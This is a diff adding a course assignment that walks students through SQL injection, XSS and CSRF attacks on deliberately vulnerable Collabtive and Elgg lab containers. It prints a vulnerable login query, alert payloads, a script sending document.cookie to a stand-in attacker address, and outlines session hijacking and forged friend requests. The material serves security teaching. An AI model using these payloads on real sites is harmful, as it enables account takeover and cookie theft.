@@ -1,2 +1,278 @@
-assignment description goes here
+This assignment will explore three different web-based attacks: SQL Injection
+(SQLi), Cross-Site Scripting (XSS), and Cross-Site Request Forgery (CSRF).
 
+The tasks will all use docker images, hosted on gizmonic. These images have
+fully-configured servers that are vulnerable to the various attacks. Any machine
+with docker installed should suffice to complete these -- you don't have to use
+the course VM if you do not wish to. Make sure there is no service on your
+machine listening on port 8080. It is unlikely that there is.
+
+For the Java code you will be writing, be aware that the VM is still the
+reference platform, and is running openjdk version "1.8.0_151".
+
+
+SQL Injection Attacks
+---------------------
+
+Your goal in these tasks is to find ways to exploit the SQL-Injection
+vulnerabilities and demonstrate the damage that can be achieved by the attacks.
+
+To retrieve the docker image, run
+
+    docker pull gizmonic.cs.umd.edu:8080/sqli
+
+Start the server by running
+
+    docker run -d -p 8080:80 --name sql_server gizmonic.cs.umd.edu:8080/sqli
+
+You can access the server in your browser at
+
+    http://localhost:8080/
+
+For these tasks, the server you are attacking is called Collabtive, which is a
+web-based project management system. It has several user accounts configured.
+To see all the users' account information, first log in as the admin using the
+following password; other users' account information can be obtained from the
+post on the front page.
+
+    username: admin 
+    password: admin
+
+Task1: SQL Injection Attack on SELECT Statements
+
+  In this task, you need to manage to log into Collabtive without providing a
+  password. You can achieve this using SQL injections. Normally, before users
+  start using Collabtive, they need to login using their user names and
+  passwords. Collabtive displays a login window to users and ask them to input
+  their username and password. The authentication is implemented by
+  include/class.user.php in the Collabtive root directory (i.e.,
+  /var/www/html/). It uses the user-provided data to find out whether they match
+  with the username and user password fields of any record in the database. If
+  there is a match, it means the user has provided a correct user name and
+  password combination, and should be allowed to login. Like most web
+  applications, PHP programs interact with their back-end databases using the
+  standard SQL language. In Collabtive, the following SQL query is constructed
+  in class.user.php to authenticate users:
+
+    $sel1 = mysql_query ("SELECT ID, name, locale, lastlogin, gender, 
+                          FROM USERS_TABLE 
+                          WHERE (name = '$user' OR email = '$user') AND pass = '$pass'");
+    
+    $chk = mysql_fetch_array($sel1);
+    
+    if (found one record) 
+        then {allow the user to login}
+
+  In the above SQL statement, the USERS TABLE is a macro in PHP, and will be
+  replaced by the users table named user. The variable $user holds the string
+  typed in the Username textbox, and $pass holds the string typed in the
+  Password textbox. User's inputs in these two textboxs are placed directly in
+  the SQL query string.
+
+  Submission: Your task is to login as bob without using his password. Please
+  submit a file called task1.txt. The first two lines should be the values you
+  entered in the login and password fields surrounded by double quotes. The two
+  lines should look exactly as follows, with your inputs in place of the -
+
+    login="-" 
+    password="-" 
+
+  Follow this with a short explanation of what your input causes to happen.
+
+Task2: SQL Injection on UPDATE Statements
+
+  In this task, you need to make an unauthorized modification to the database.
+  Your goal is to modify another user's profile using SQL injections. In
+  Collabtive, if users want to update their profiles, they can go to "My
+  account", click the "Edit" link, and then fill out a form to update the
+  profile information. After the user sends the update request to the server, an
+  UPDATE SQL statement will be constructed in include/class.user.php. The
+  objective of this statement is to modify the current user's profile
+  information in the users table. There is a SQL injection vulnerability in this
+  SQL statement. Please find the vulnerability, and then use it to change
+  another user's profile without knowing their password. For example, if you are
+  logged in as Alice, your goal is to use the vulnerability to modify Bob's
+  profile information, including Bob's password. After the attack, you should be
+  able to log into Bob's account.
+
+  Submission: Your task is to change Bob's password by modifying a different
+  users profile. Please submit a file called task2.txt with the following
+  format:
+
+    1: Bob's new password after your injection, wrapped in double quotes.
+
+    2: User whose profile you are modifying
+
+    3-n: One line for each profile parameter you changed, like so:
+           "param"="new value"
+
+         Please note that both the parameter name and new value should be
+         wrapped in double quotes, so that we can clearly see any spaces you
+         might have added. Also, the parameter name should be exactly as it
+         appears in the source code.
+
+    n+1: A blank line 
+
+    n+2 to end: The remaining lines should contain a short write up explaining
+                the steps you used to create a working SQL injection attack that
+                updates Bob's password to a new value.
+
+For the SQL Injection attacks, your repository should include:
+
+  task1.txt 
+  task2.txt 
+
+
+XSS Attack
+----------
+
+Your goal in these tasks is to find ways to exploit the Cross-Site Scripting
+vulnerabilities and demonstrate the damage that can be achieved by the attacks.
+
+To retrieve the docker image, run
+
+    docker pull gizmonic.cs.umd.edu:8080/xss
+
+Start the server by running
+
+    docker run -d -p 8080:80 --name xss_server gizmonic.cs.umd.edu:8080/xss
+
+You can access the server in your browser at
+
+    http://localhost:8080/
+
+For these tasks, the server you are attacking is called Elgg, which is a social
+networking application. It has several user accounts configured, with the
+following credentials:
+
+    USER     USERNAME  PASSWORD
+    Admin    admin     seedelgg
+    Alice    alice     seedalice
+    Boby     boby      seedboby
+    Charlie  charlie   seedcharlie
+    Samy     samy      seedsamy
+
+  Warmup - No submission Necessary 
+
+    The objective of this task is to embed a JavaScript program in your Elgg
+    profile, such that when another user views your profile, the JavaScript
+    program will be executed and an alert window will be displayed. The
+    following JavaScript program will display an alert window:  
+ 	
+      <script>alert('XSS')</script> 
+
+    If you embed the above JavaScript code in your profile (e.g. in the brief
+    description field), then any user who views your profile will see the alert
+    window.
+  
+    In this case, the JavaScript code is short enough to be typed into the short
+    description field. If you want to run a long JavaScript, but you are limited
+    by the number of characters you can type in the form, you can store the
+    JavaScript program in a standalone file, save it with the .js extension, and
+    then refer to it using the src attribute in the <script> tag. See the
+    following example: 
+ 
+      <script type = "text/javascript"   
+        src = http://www.example.com/myscripts.js>  
+      </script> 
+ 
+    In the above example, the page will fetch the JavaScript program from
+    http://www.example.com, which can be any web server. 
+
+Task 3: Posting a Malicious Message to Display Cookies 
+
+  The objective of this task is to embed a JavaScript program in your Elgg
+  profile, such that when another user views your profile, the user's cookies
+  will be displayed in the alert window. This can be done by adding some
+  additional code to the JavaScript program in the previous task:  
+  
+    <script>alert(document.cookie);</script> 
+
+3.1 Stealing Cookies from the Victim's machine 
+
+In the previous task, the malicious JavaScript code written by the attacker can print out the user's cookies, but only the user can see the cookies, not the attacker. In this task, the attacker wants the JavaScript code to send the cookies to himself/herself. To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request.
+ 
+ We can do this by having the malicious JavaScript insert an <img> tag wits src attribute set to the attacker's machine. When the JavaScript inserts the img tag, the browser tries to load the image from the URL in the src field; this results in an HTTP GET request sent to the attacker's machine. The JavaScript given below sends the cookies to the port 5555 of the attacker's machine, where the attacker has a TCP server listening to the same port. The server can print out whatever it receives. The TCP server program will be given to you.
+ 
+<script>document.write('<img src=http://attacker_IP_address:5555?c='
+			 	+ escape(document.cookie) + ' >'); 
+</script> 
+ 
+Note: After you download the TCP echo server, type "make" to compile, and please read the README file on important information regarding how to start the server on port 5555. The cookie that will be printed on the terminal will be URL encoded. 
+ 
+Submission: Please submit a file called task3.txt. The grading will be done as below: We will run the echo server on localhost on port 5555. We will edit the brief description field acting as the user Alice using the message contents as specified by your task3.txt. Then, when Boby opens this message, Boby's cookie should be printed by the echo server.
+
+
+3.2   Session Hijacking using the Stolen Cookies   
+
+After stealing the victim's cookies, the attacker can do whatever the victim can do to the Elgg web server, including adding and deleting friends on behalf of the victim, deleting the victim's post, etc. Essentially, the attacker has hijacked the victim's session. In this task, we will launch this session hijacking attack, and write a program to add a friend on behalf of the victim.  
+ 
+To add a friend for the victim, we should first find out how a legitimate user adds a friend in Elgg. More specifically, we need to figure out what are sent to the server when a user adds a friend. A screenshot of the request is provided to you. From the contents, you can identify all the parameters in the request.
+ 
+Once we have understood what the HTTP request for adding friends look like, we can write a Java program to send out the same HTTP request. The Elgg server cannot distinguish whether the request is sent out by the user's browser or by the attacker's Java program. As long as we set all the parameters correctly, and the session cookie is attached, the server will accept and process the project-posting HTTP request. To simplify your task, we provide you with a sample Java program that does the following:  
+ 
+1. Open a connection to web server.  
+2. Set the necessary HTTP header information.  
+3. Send the request to web server.  
+4. Get the response from web server. 
+ 
+Note1: Elgg uses two parameters __elgg_ts and __elgg_token. Make sure that you set these parameters correctly for your attack to succeed.  Also, please note down the correct guid of the friend who needs to be added to the friend list.  You need to use that guid in the program code for the attack to succeed.
+ 
+Note2: You can compile a java program into bytecode by running javac HTTPSimpleForge.java on the console. You can run the byte code by running java HTTPSimpleForge.  
+ 
+Submission: Please submit a file called HTTPSimpleForge.java.  
+
+Grading: Your java file will be compiled into byte code and executed. We will login as Alice, and try to add Boby as a friend to Alice by running your compiled code. Make sure you include the correct guid and parameters in the code for the above scenario to execute properly.   
+ 
+Input:  Your java program should read from an input file called HTTPSimpleForge.txt. The first line of the input file contains the __elgg_ts token (absolute value), the second line contains the __elgg_token (absolute value) and the third line would contain the Cookie value (Elgg=<<cookie value>>).  You can create a text file locally for testing out your code, however, you do not need to submit this file as part of your submission. We will use our own HTTPSimpleForge.txt file for checking.
+
+
+CSRF Attack Lab
+
+1. Overview 
+
+The objective of this lab is to help students understand the Cross-Site Request Forgery (CSRF or XSRF) attack. A CSRF attack involves a victim user, a trusted site, and a malicious site. The victim user holds an active session with a trusted site while visiting a malicious site. The malicious site injects an HTTP request for the trusted site into the victim user session, causing damages. 
+ 
+In this lab, students will be attacking a social networking web application using the CSRF attack. The open-source social networking application called Elgg has countermeasures against CSRF, but we have turned them off for the purpose of this lab.
+
+2. Lab Environment
+You will be using our pre-built docker image for this lab. 
+//TODO How to Download and run the docker image, and load up the app in browser
+
+3. Background of CSRF Attacks
+
+A CSRF attack involves three actors: a trusted site (Elgg), a victim user of the trusted site, and a malicious site. The victim user simultaneously visits the malicious site while holding an active session with the trusted site. The attack involves the following sequence of steps: 
+ 
+1. The victim user logs into the trusted site using his/her username and password, and thus creates a new session.  
+ 
+2. The trusted site stores the session identifier for the session in a cookie in the victim user's web browser.  
+ 
+3. The victim user visits a malicious site.  
+ 
+4. The malicious site's web page sends a request to the trusted site from the victim user's browser. This request is a cross-site request, because the site from where the request is initiated is different from the site where the request goes to.  
+ 
+5. By design, web browsers automatically attach the session cookie to the request, even if it is a cross-site request.  
+ 
+6. The trusted site, if vulnerable to CSRF, may process the malicious request forged by the attacker web site, because it does not know whether the request is a forged cross-site request or a legitimate one. 
+ 
+The malicious site can forge both HTTP GET and POST requests for the trusted site. Some HTML tags such as img, iframe, frame, and form have no restrictions on the URL that can be used in their attribute. HTML img, iframe, and frame can be used for forging GET requests. The HTML form tag can be used for forging POST requests. Forging GET requests is relatively easier, as it does not even need the help of JavaScript; forging POST requests does need JavaScript. Since Elgg only uses POST, the tasks in this lab will only involve HTTP POST requests.
+ 
+4. Lab Tasks
+ 
+4.1 CSRF Attack using GET Request 
+ 
+In this task, we need two people in the Elgg social network: Alice and Boby. Boby wants to become a friend to Alice, but Alice refuses to add Boby to her Elgg friend list. Boby decides to use the CSRF attack to achieve his goal. He sends Alice an URL (via an email or a posting in Elgg); Alice, curious about it, and clicks on the URL. Pretend that you are Boby, describe how you can construct the content of the web page, so as soon as Alice visits the web page, Boby is added to the friend list of Alice (assuming Alice has an active session with Elgg).  
+ 
+To add a friend to the victim, we need to identify the Add Friend HTTP request, which is a GET request. In this task, you are not allowed to write JavaScript code to launch the CSRF attack. Your job is to make the attack successful as soon as Alice visits the web page, without even making any click on the page (hint: you can use the img tag, which automatically triggers an HTTP GET request). 
+ 
+Whenever the victim user visits the crafted web page in the malicious site, the web browser automatically issues a HTTP GET request for the URL contained in the img tag. Because the web browser automatically attaches the session cookie to the request, the trusted site cannot distinguish the malicious request from the genuine request and ends up processing the request compromising the victim user's session integrity.  
+ 
+Observe the request structure for adding a new friend and then use this to forge a new request to the application. When the victim user visits the malicious web page, a malicious request for adding a friend should be injected into the victim's active session with Elgg. 
+ 
+Submission: You are required to submit a file named task5.html. When a victim user named Alice is logged in , and visits the attacker website localhost:<<port>>/task5.html in another tab, Boby should be added as a friend to Alice's Friend List.  
+ 
+To test this, you will need to place the task2.html file under the directory /var/www/CSRF/elgg/ in the docker container.
+
+//TODO Command to copy task5.html from host to docker container directory /var/www/CSRF/elgg/  
+ 
+Tip: Your browser may not refresh on its own. You might need to press the reload/refresh button to reload the page, to see if Boby is added as a friend to Alice's account.
